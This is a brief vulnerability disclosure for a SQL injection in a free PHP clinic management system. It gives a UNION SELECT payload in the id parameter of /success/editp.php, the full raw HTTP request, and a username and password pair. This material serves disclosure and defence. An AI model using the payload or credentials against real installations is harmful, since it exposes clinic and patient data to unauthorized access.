# Online Clinic Management System v1.0 has SQL injection

nick-name: jacky.liu

vendors: https://itsourcecode.com/free-projects/php-project/online-clinic-management-system-php-projects-source-code/

dbname= id8650063_suarezclinicdb

username&password = admerc@yahoo.com/itota

Vulnerability File: /success/editp.php

Vulnerability location: /success/editp.php?action=edit & id=, id

[+] Payload: /success/editp.php?action=edit & id=201801 union select 1,database(),3,4,5,6--+

```sql
GET /success/editp.php?action=edit%20&%20id=201801%20union%20select%201,database(),3,4,5,6--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=k7u4fodbeos6ie4oc0oa29u5qg
Connection: close
```

![image](https://github.com/user-attachments/assets/6a251f9b-75ec-40b5-8f02-e632686f1e61)
